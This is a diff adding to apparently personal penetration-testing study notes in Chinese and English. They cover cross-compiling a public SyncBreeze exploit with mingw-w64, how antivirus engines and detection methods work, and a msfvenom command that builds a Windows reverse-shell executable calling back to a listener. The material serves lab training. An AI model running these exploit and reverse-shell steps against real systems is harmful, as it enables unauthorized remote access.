@@ -2639,3 +2639,126 @@ Copied to: /home/chw/42341.c
 
 
 ###  Cross-Compiling Exploit Code 交叉編譯漏洞
+- mingw-w64交叉編譯器 ([document](https://www.mingw-w64.org/)): 專門用於在 Windows 平台上生成原生的 Windows 應用程式。
+
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ sudo apt install mingw-w64
+
+┌──(chw㉿CHW-kali)-[~]
+└─$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x97): undefined reference to `_imp__WSAStartup@8'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0xa5): undefined reference to `_imp__WSAGetLastError@0'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0xe9): undefined reference to `_imp__socket@12'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0xfc): undefined reference to `_imp__WSAGetLastError@0'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x126): undefined reference to `_imp__inet_addr@4'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x146): undefined reference to `_imp__htons@4'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x16f): undefined reference to `_imp__connect@12'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x1b8): undefined reference to `_imp__send@16'
+/usr/bin/i686-w64-mingw32-ld: /tmp/ccpUxCER.o:42341.c:(.text+0x1eb): undefined reference to `_imp__closesocket@4'
+collect2: error: ld returned 1 exit status
+```
+編譯過程中出現了問題，透過簡單的 Google 搜尋與「[WSAStartup](https://learn.microsoft.com/zh-tw/windows/win32/api/winsock/nf-winsock-wsastartup)」相關的第一個錯誤就會發現這是在 winsock.h 中找到的函數:找不到 Winsock 庫時，會發生這些錯誤\
+搜尋 `ws2_32 DLL` 並透過靜態連結將其包含在最終的可執行檔中
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ i686-w64-mingw32-gcc 42341.c -o syncbreeze_exploit.exe -lws2_32
+```
+> ws2_32 是 Windows Sockets 2（Winsock 2）的函式庫
+
+### Fixing the Exploit
+Inspecting the `42341.c` C code, we'll notice that it uses hard-coded values for the IP address and port fields:
+```c
+printf("[>] Socket created.\n");
+server.sin_addr.s_addr = inet_addr("10.11.0.22");
+server.sin_family = AF_INET;
+server.sin_port = htons(80);
+```
+
+>[!Caution]
+> SKIP
+
+# Antivirus Evasion
+>[!Note]
+> Antivirus (AV):\
+> 在預防、偵測和刪除惡意軟體的應用程式, 現在通常包含額外的保護功能，如IDS/IPS、防火牆、網站掃描器等。
+
+防毒軟體的操作和決策是基於簽章(signatures)\
+modern AV solutions, including Windows Defender, are shipped with a Machine Learning (ML) engine that is queried whenever an unknown file is discovered on a system.\
+EDR 負責生成 security-event telemetry，並將這些資料轉發至安全資訊與事件管理（SIEM）系統
+
+## AV Engines and Components
+A modern antivirus is typically designed around the following components:
+- File Engine 檔案引擎
+both scheduled and real-time file scans. Parses the entire file system and sends each file's metadata or data to the signature engine
+- Memory Engine 記憶體引擎
+binary signatures or suspicious API calls that might result in memory injection attacks
+- Network Engine 網路引擎
+incoming and outgoing network traffic. Attempt to block the malware from communicating with its [Command and Control (C2) server](https://www.paloaltonetworks.com/cyberpedia/command-and-control-explained)
+- Disassembler 反組譯器
+translating machine code into assembly language
+- Emulator/Sandbox 模擬器/沙盒
+- Browser Plugin 瀏覽器外掛
+get better visibility and detect malicious content 
+- Machine Learning Engine 機器學習引擎
+
+## Detection Methods
+following AV detection methodologies and explain how they work
+- Signature-based Detection
+the filesystem is scanned for known malware signatures
+- Heuristic-based Detection
+relies on various rules and algorithms to determine whether or not an action is considered malicious
+- Behavioral Detection
+analyzes the behavior of a binary file.
+- Machine Learning Detection
+Microsoft Windows Defender has two ML components: 
+    - client ML engine: which is responsible for `creating ML models` and `heuristics`.
+    - cloud ML engine: which is capable of analyzing the `submitted sample against a metadata-based model` comprised of all the submitted samples.
+
+
+### xxd
+```
+CWei@CHW-MacBook-Pro Desktop % cat malware.txt
+chw
+CWei@CHW-MacBook-Pro Desktop % xxd malware.txt
+00000000: 6368 770a                                chw.
+CWei@CHW-MacBook-Pro Desktop % xxd -b malware.txt
+00000000: 01100011 01101000 01110111 00001010                    chw.
+```
+> `xxd`: 查看檔案的 hex 或 binary 內容的工具\
+> `-b`: 以二進制形式\
+> `01100011 01101000 01110111 00001010`\
+01100011：對應 ASCII 字元 c\
+01101000：對應 ASCII 字元 h\
+01110111：對應 ASCII 字元 w\
+00001010：對應 ASCII 字元 \n
+
+### sha256sum / shasum
+calculate the hash of the file
+```
+CWei@CHW-MacBook-Pro Desktop % shasum -a 256 malware.txt
+903a570b9401c66909fe7addb6d4c495f9f08eeda124153098dc6d1d0baa4331  malware.txt
+
+┌──(chw㉿CHW-kali)-[~]
+└─$ sha256sum malware.txt
+903a570b9401c66909fe7addb6d4c495f9f08eeda124153098dc6d1d0baa4331  malware.txt
+```
+若更改檔案中內容會導致 hash 值完全改變，這證明僅依賴 hash文件簽名檢測的脆弱性。(只看 Signature-based Detection 缺乏完整性)\
+→ Heuristic-based Detection
+
+以下範例使用使用一個簡單的 TCP reverse shell\
+從掃描 popular Metasploit payload 開始。使用msfvenom，我們將產生一個包含有效負載的 Portable Executable (PE) file\
+
+>[!Important]
+> PE file format 在 Windows 作業系統上用於執行檔和目標檔。 PE 格式表示一種 Windows 資料結構，詳細說明了Windows Loader 管理打包的可執行程式碼所需的資訊，包括所需的 dynamic libraries、API import and export tables 等。
+
+```
+┌──(chw㉿CHW-kali)-[~]
+└─$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
+...
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder specified, outputting raw payload
+Payload size: 324 bytes
+Final size of exe file: 73802 bytes
+```
